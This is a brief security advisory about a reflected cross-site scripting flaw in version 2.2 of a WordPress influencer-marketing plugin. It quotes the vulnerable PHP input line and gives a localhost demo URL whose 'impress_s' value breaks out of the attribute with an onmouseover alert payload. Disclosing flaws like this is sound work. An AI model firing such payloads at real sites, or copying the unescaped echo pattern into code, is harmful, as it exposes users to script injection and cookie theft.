Vulnerable Influencer Marketing & Press Release System plugin 2.2
Influencer Marketing & Press Release System plugin is prone to a
cross-site scripting
vulnerability because it fails to sufficiently sanitize user-supplied data.

An attacker may leverage this issue to execute arbitrary script code in the
browser of an unsuspecting user in the context of the affected site. This
may allow the attacker to steal cookie-based authentication credentials and
to launch other attacks.

To exploit this issue following steps:
The XSS reflected because the "impress_s" value is not filter correcly
and it is possible bypassing the

sanitize_text_field() wordpress function:

<input type="text" id="impress_search_feed_input" name="impress_s"
value="<?php echo (isset($_GET['impress_s']) &&
!empty($_GET['impress_s'])) ? sanitize_text_field($_GET['impress_s'])
: ""; ?>" required="required" />


Demo url:*http://localhost/wordpress/wp-admin/admin.php?impress_s=
<http://localhost/wordpress/wp-admin/admin.php?impress_s=>"
onmouseover=alert(1)
display=&page=imkt_feed&impress_search_btn=impress_search_feed_btn*
